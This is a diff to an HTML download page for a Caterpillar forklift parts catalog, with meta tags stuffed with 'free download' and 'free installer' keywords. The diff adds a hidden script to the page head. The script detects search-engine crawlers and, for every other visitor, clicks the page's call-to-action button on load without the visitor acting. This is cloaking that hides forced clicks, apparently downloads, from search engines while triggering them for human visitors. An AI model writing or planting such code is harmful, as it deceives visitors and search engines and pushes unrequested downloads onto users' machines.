@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Caterpillar Forklift MCFS 04.2024 (ASIA)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Caterpillar Forklift MCFS 04.2024 spare parts catalog and workshop manual for detailed info on parts, accessories, and management for ASIA.">
     <meta name="keywords" content="Caterpillar Forklift MCFS 04.2024, Caterpillar Forklift MCFS 2024, Caterpillar Forklift MCFS ASIA, Caterpillar Forklift MCFS 2024 download, Caterpillar Forklift MCFS 2024 free download, Caterpillar Forklift MCFS spare parts catalog, Caterpillar Forklift MCFS workshop manual, Caterpillar Forklift MCFS parts catalog download, Caterpillar Forklift MCFS spare parts catalog 2024, Caterpillar Forklift MCFS free download, Caterpillar Forklift MCFS 2024 free download, Caterpillar Forklift MCFS ключ, Caterpillar Forklift MCFS 2024 скачать бесплатно, Caterpillar Forklift MCFS 2024 каталог запчастей, Caterpillar Forklift MCFS 04.2024 каталог запчастей, каталог запчастей для погрузчиков Caterpillar 2024, каталог запчастей для погрузчиков Caterpillar 04.2024, Caterpillar Forklift MCFS 2024 каталог запчастей скачать, каталог запчастей для погрузчиков Caterpillar скачать бесплатно, Caterpillar Forklift MCFS 2024 Украина, Caterpillar Forklift MCFS каталог запчастин, каталог запчастин для навантажувачів Caterpillar 2024, каталог запчастин для навантажувачів Caterpillar 04.2024, Caterpillar Forklift MCFS 2024 каталог запчастин завантажити, каталог запчастин для навантажувачів Caterpillar безкоштовно, Forklift Parts Catalog, Asia Forklift Parts, MCFS Lift Truck Parts, Caterpillar Forklift Spare Parts, Forklift Accessories MCFS, Electronic Parts Catalog, Forklift Service Manuals, Spare Parts Management, MCFS Parts Books, Forklift Diagrams MCFS, Asian Market Forklifts, Hand Pallet Forklifts, Electric Forklift Models, Cushion Tire Forklifts, free download, free installer, free download installer">
     <style>
